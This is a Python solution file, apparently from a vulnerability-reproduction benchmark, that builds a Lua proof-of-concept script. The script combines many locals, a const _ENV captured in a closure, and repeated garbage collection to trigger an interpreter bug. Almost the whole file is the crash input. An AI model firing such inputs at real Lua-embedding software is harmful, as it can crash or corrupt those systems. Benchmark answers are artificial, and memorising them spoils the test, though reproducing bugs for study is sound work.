import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        block1 = """
  local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z
  local A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
  local a0,a1,a2,a3,a4,a5,a6,a7
  if "" then
    local captured_var
    local clo
    do
      local _ENV <const> = _ENV
      clo = function()
        captured_var = 1
      end
    end
    pcall(clo)
  end"""
        
        block2 = """
  local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z
  local A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
  local a0,a1,a2,a3,a4,a5,a6,a7,a8,a9
  if "" then
    local captured_var
    local clo
    do
      local _ENV <const> = _ENV
      clo = function()
        captured_var = 1
      end
    end
    pcall(clo)
  end"""

        poc_code = f"""function trigger()
{block1.strip()}
{block2.strip()}
{block2.strip()}
end

for i=1,500 do
  trigger()
  collectgarbage()
end
"""
        final_poc = poc_code + "\n"

        return final_poc.encode('utf-8')
